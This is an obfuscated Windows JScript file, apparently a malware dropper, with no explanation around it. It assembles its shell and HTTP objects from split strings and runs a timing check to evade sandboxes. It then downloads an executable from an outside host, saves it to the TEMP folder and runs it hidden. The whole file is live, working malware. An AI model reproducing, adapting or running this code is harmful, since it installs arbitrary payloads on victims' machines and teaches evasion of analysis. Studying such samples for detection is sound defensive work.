var LX = false;
var KO = "Create"+"Object";
var K0 = function OE() {return WScript[KO]("WScript"+".Shell");}(), Z0 = 11;
var HO = "MSXML2"+".XMLHTTP";
var T = 2;
var A = T - 2;
function SA(O){K0["Run"](O, A, A);};
function KY(){return HO + "";};
function I(ZB, HQ){A = A * 1; return ZB - HQ;};
function S(){return KO;};
/*@cc_on
  @if (@_win32 || @_win64)
    LX = true;
  @end
@*/
if (LX)
{
var DU = "";
function Y(){return 22;};
var XR = 0; var E0 = 0;
function GY()
{
var KU = new this["Date"]();
var Z = KU["getUTCMilliseconds"]();
WScript["Sleep"](Y());
var KU = new this["Date"]();
var K = KU["getUTCMilliseconds"]();
WScript["Sleep"](Y());
var KU = new this["Date"]();
var MR = KU["getUTCMilliseconds"]();
var XR = "CN";
XR = I(K, Z);
var E0 = "J";
E0 = I(MR, K);
DU = "open";
return I(XR, E0);
}
var UD = false;
var M = false;
for (var ZR = A; ZR < Y() * 1; ZR++){if (GY() != A){
UD = true; 
E0 = "31" + 11 * XR + E0; 
M = true; 
break;
}}
function U() {return ((UD == true) && (UD == M)) ? 1 : A;};
if (UD && U() && M){
function OT() {return K0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "YQyXhc6tjPOKSZo8.ex" + "e";};
 JU = KY();
 UH = WScript[KO](JU);
 var KH = 1;
do { 
	for (;KH;){
	try {
		if (KH == 1)
		{
			UH[DU]("GET", "http://be-stlines-tore.com/u3rsap", false);
			UH["send"]();
			DT = "Sleep";
			KH = 2;
		}
		WScript[DT](Y() + 120); 
		if (UH["readystate"] < 2 * 2) continue;
		KH = A;
		function L(OE0) {var E = (1, 2, 3, 4, 5, OE0); return E;};
		OR = WScript[S()]("ADODB.Stream");
		JU = OR;
		JU[DU]();
		JU["type"] = L(1);
		JU["write"](UH["ResponseBody"]);
		OR["position"] = L(A);
		JU["Save" + "ToFile"](OT(), 2);
		OR["cl"+"ose"]();
		S0 = OT();
		SA(S0);
	} catch(Q){};};
}while (KH);
}
}

